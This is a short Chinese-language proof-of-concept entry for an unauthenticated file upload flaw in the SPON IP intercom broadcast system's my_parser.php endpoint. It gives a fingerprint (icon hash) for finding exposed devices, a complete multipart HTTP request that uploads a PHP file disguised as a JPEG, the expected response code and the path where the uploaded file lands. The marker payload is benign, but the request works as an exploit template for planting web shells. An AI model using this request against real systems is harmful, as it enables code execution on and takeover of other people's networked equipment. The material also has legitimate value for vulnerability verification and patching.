﻿# SPON IP网络对讲广播系统 my_parser 文件上传

> 更新时间：2024-01-19

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：icon_hash="-1830859634"

> 验证脚本：HTTP

```
POST /upload/my_parser.php HTTP/1.1
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------402880817133959846752911683338
Connection: close

-----------------------------402880817133959846752911683338
Content-Disposition: form-data; name="upload"; filename="dudesuite.php"
Content-Type: image/jpg

<?php echo "dudesuite"; ?>
-----------------------------402880817133959846752911683338--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/upload/files/dudesuite.php


> 验证文件来源：SPON IP网络对讲广播系统 my_parser 文件上传.poc
